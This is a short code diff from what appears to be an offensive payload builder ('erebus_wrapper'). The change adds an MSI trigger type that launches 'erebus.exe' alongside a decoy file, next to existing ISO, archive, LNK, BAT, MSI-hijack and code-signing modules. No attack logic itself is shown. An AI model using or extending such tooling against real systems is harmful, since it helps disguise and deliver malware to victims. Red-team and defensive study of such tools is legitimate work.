@@ -13,6 +13,7 @@ from erebus_wrapper.erebus.modules.container_clickonce import build_clickonce
 from erebus_wrapper.erebus.modules.container_msi import build_msi, hijack_msi
 from erebus_wrapper.erebus.modules.trigger_lnk import create_payload_trigger
 from erebus_wrapper.erebus.modules.trigger_bat import create_bat_payload_trigger
+from erebus_wrapper.erebus.modules.trigger_msi import create_msi_payload_trigger
 from erebus_wrapper.erebus.modules.container_archive import build_7z, build_zip
 from erebus_wrapper.erebus.modules.container_iso import build_iso
 from erebus_wrapper.erebus.modules.codesigner import self_sign_payload, get_remote_cert_details, sign_with_provided_cert
@@ -530,7 +531,7 @@ generated if none have been entered.""",
             name="7.0 Trigger Type",
             parameter_type=BuildParameterType.ChooseOne,
             description="Type of Trigger to toggle decoy and execution",
-            choices=["LNK", "BAT"],
+            choices=["LNK", "BAT", "MSI"],
             default_value="LNK",
             required=False,
         ),
@@ -1502,6 +1503,14 @@ generated if none have been entered.""",
                                 payload_dir=payload_dir,
                                 decoy_file=decoy_file
                             )
+
+                        case "MSI":
+                            trigger_path= create_msi_payload_trigger(
+                                payload_exe="erebus.exe",
+                                payload_dir=payload_dir,
+                                decoy_file=decoy_file
+                            )
+                            
 
                     if trigger_path:
                         response.status = BuildStatus.Success
